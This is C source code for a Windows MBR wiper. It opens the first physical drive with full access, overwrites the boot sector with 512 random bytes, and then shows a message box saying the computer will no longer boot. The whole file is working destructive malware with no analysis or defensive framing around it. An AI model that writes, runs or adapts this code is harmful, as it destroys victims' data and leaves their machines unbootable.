#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <mem.h>

#define ID_MANIFEST 1
#ifndef RT_MANIFEST
#define RT_MANIFEST MAKEINTRESOURCE(24)
#endif

char* rand_string(char* resultString, size_t length)
{
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    if (length) {
        for (int i = 1; i < length; i++)
        {
            // Pick anyone char in charset by its position using: (rand() % (upper - lower + 1)) + lower
            int position = rand() % (int)(sizeof(charset) - 1);

            resultString[i] = charset[position];
        }
    }

    return resultString;
}

char* rand_string_alloc(size_t size)
{
     char *s = (char*) malloc(size + 1);
     if (s) {
         rand_string(s, size);
     }
     return s;
}

int main()
{
    HANDLE handleMBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

    LPCVOID lpBuffer = rand_string_alloc(512);

    BOOL isSuccess = WriteFile(handleMBR, lpBuffer, 512, NULL, NULL);

    CloseHandle(handleMBR);
    
    free((void*) lpBuffer);

    if (isSuccess)
    {
        //printf("Done, your comp is gone!");
        int msgboxID = MessageBox(
            NULL,
            (LPCSTR) "You won't be able to boot after this.",
            (LPCSTR) "Alert",
            MB_OK | MB_ICONEXCLAMATION
        );
    }

    return 0;
}